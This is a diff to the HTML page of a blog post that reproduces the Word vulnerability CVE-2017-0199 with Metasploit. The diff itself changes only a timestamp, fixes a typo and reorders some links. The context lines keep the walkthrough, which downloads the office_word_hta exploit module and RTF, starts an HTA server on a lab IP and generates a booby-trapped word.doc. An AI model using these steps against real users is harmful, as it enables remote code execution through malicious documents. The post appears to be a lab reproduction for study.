@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/%5B%5BEO%7B115%7BUSRO1%253OU@Z01M.png">
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/74W7L%60$%25QH%7BD9W8%7D3%287M8%253.png">
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/AZ7_@BN4O%7B%7B0NN%25%28%5BO6$90X.png">
-<meta property="og:updated_time" content="2017-05-15T16:44:23.160Z">
+<meta property="og:updated_time" content="2017-06-10T08:11:35.121Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Word漏洞msf复现与浅析">
 <meta name="twitter:description" content="前言漏洞编号：CVE-2017-0199
@@ -209,7 +209,7 @@
 <p>我这边用的是ssh，因为另一台电脑装了kali最新版，所以直接开个ssh。</p>
 <p>首先cd 到<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/</span>modules<span class="regexp">/exploits/</span>windows/fileformat 目录下</div><div class="line"></div><div class="line">wget <span class="string">https:</span><span class="comment">//raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb</span></div></pre></td></tr></table></figure><br>然后执行wget下载payload，然后切换到<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/</span>data<span class="regexp">/exploits/</span></div><div class="line"></div><div class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/nixawk/m</span>etasploit-framework<span class="regexp">/3d082814cbedc065f329498b9c6fb7951f8ebbd5/</span>data<span class="regexp">/exploits/</span>cve-<span class="number">2017</span>-<span class="number">0199</span>.rtf</div></pre></td></tr></table></figure></p>
 <p>wget下载exploit。</p>
-<p>进入到msf，使用relod_all，刷新一下下载的载荷。<br><img src="http://oo1re7zx4.bkt.clouddn.com/_F_T66I6N9%28WLP%29W%29ZKJOIH.png" alt=""></p>
+<p>进入到msf，使用reload_all，刷新一下下载的载荷。<br><img src="http://oo1re7zx4.bkt.clouddn.com/_F_T66I6N9%28WLP%29W%29ZKJOIH.png" alt=""></p>
 <p>然后开启hat服务<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/windows/misc/ht<span class="built_in">a_server</span> </div><div class="line">msf exploit(ht<span class="built_in">a_server</span>) &gt; run</div></pre></td></tr></table></figure><br><img src="http://oo1re7zx4.bkt.clouddn.com/%5B%5BEO%7B115%7BUSRO1%253OU@Z01M.png" alt=""></p>
 <p>上面的命令相当于开启了一个web服务，并且提供了一个可供下载的hat文件。<br><a href="http://10.20.79.234:8080/yETy5CKuqcXljn.hta" target="_blank" rel="external">http://10.20.79.234:8080/yETy5CKuqcXljn.hta</a></p>
 <p>加载exploit<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/fileformat/office_word_hta<span class="comment"> //加载exploit</span></div><div class="line"><span class="built_in">set</span> TARGETURI <span class="keyword">http</span>://<span class="number">10.20</span><span class="number">.79</span><span class="number">.234</span>:<span class="number">8080</span>/yETy5CKuqcXljn.hta<span class="comment"> //加载刚刚生成的hta文件</span></div><div class="line"><span class="built_in">set</span> FILENAME <span class="built_in">word</span>.doc<span class="comment"> //设置生成doc文件的文件名</span></div><div class="line">run<span class="comment"> //生成一个嵌套代码的word文档。</span></div><div class="line">cp /root/.msf4/<span class="built_in">local</span>/<span class="built_in">word</span>.doc /<span class="built_in">word</span>.doc<span class="comment"> //将生成的文件拷贝到根目录。</span></div></pre></td></tr></table></figure></p>
@@ -571,11 +571,15 @@ var _hmt = _hmt || [];
             </li>
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>欢迎友情链接</a>
+              <a href="http://白帽黑客.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>白帽黑客Blog</a>
             </li>
           
             <li class="search-li">
               <a href="http://边缘.ren" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>边缘人</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>欢迎友情链接</a>
             </li>
           
         </ul>
